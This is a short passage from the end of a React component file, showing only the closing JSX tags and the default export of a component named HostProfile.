    </div>
      )}
    </>
  );
};

export default HostProfile;
